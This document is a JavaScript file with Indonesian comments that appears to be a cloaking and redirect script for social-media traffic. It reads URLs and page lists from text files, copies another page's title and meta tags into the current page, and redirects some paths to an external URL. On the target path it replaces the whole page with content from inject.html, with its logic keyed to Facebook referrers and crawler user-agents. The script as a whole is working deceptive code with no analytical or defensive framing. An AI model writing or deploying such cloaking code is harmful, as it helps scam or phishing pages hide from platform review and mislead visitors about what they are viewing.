(function () {
  const referrer = document.referrer; // Mendapatkan referer
  const userAgent = navigator.userAgent; // Mendapatkan user-agent
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
  const currentPath = location.pathname; // Mendapatkan path URL saat ini
  const testing = true; // Flag untuk pengujian

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    const response = await fetch(filePath);
    if (!response.ok) {
      throw new Error(`Failed to fetch ${filePath}`);
    }
    return response.text();
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
  ])
    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman

      if (landingPageList.some((page) => currentPath.includes(page))) {
        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
        injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
        // Cross-browser compatible approach for fetching inject.html
        const loadInjectHTML = () => {
          // Use XMLHttpRequest for maximum browser compatibility
          const xhr = new XMLHttpRequest();
          const timestamp = new Date().getTime();
          const injectPath = window.location.origin + '/inject.html?nocache=' + timestamp;
          
          xhr.open('GET', injectPath, true);
          xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          xhr.setRequestHeader('Pragma', 'no-cache');
          xhr.setRequestHeader('Expires', '0');
          
          xhr.onload = function() {
            if (xhr.status >= 200 && xhr.status < 300) {
              const html = xhr.responseText;
              
              if (!html || html.trim() === '') {
                console.error('Fetched inject.html is empty');
                alert('Failed to load content. Please refresh the page.');
                return;
              }
              
              console.log('Inject HTML fetched successfully');
              
              try {
                // Replace document content
                document.open();
                document.write(html);
                document.close();
                
                // Inject metadata after DOM replacement
                setTimeout(() => {
                  injectMetadata(originalHtml);
                  console.log('Metadata injection complete');
                }, 200); // Increased timeout for slower browsers
              } catch (e) {
                console.error('Error replacing document content:', e);
              }
            } else {
              console.error('Failed to fetch inject.html:', xhr.status, xhr.statusText);
              alert('Failed to load content. Please try again later.');
            }
          };
          
          xhr.onerror = function() {
            console.error('Network error while fetching inject.html');
            alert('Network error. Please check your connection and try again.');
          };
          
          xhr.send();
        };
        
        // Execute the function to load inject.html
        loadInjectHTML();
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();